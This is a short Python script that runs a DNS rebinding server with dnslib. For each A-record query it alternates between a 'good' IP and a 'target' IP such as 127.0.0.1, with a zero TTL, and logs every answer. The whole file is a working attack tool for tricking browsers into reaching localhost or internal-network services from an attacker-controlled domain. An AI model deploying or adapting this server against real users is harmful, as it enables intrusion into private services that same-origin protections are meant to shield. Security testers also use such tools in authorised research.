from dnslib import DNSRecord, RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver
import threading
from datetime import datetime


class RebindResolver(BaseResolver):
    def __init__(self, ip1, ip2):
        self.ip1 = ip1
        self.ip2 = ip2
        self.lock = threading.Lock()
        self.toggle = False

    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)
        client = handler.client_address[0]

        if request.q.qtype == QTYPE.A:
            with self.lock:
                now = datetime.now()

                if self.toggle:
                    ip = self.ip2
                else:
                    ip = self.ip1

                self.toggle = not self.toggle

            reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))
            timestamp = now.strftime("%H:%M:%S.%f")[:-3]
            print(f"[{timestamp}] {client} -> {qname.rstrip('.')} = {ip}")

        return reply


if __name__ == "__main__":
    import sys

    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <good_ip> <target_ip>")
        print(f"Example: {sys.argv[0]} 134.209.10.50 127.0.0.1")
        sys.exit(1)

    resolver = RebindResolver(sys.argv[1], sys.argv[2])
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    print(f"DNS rebinding server started")
    print(f"  Alternating: {sys.argv[1]} <-> {sys.argv[2]}")
    print(f"  Watching for queries...\n")
    server.start()
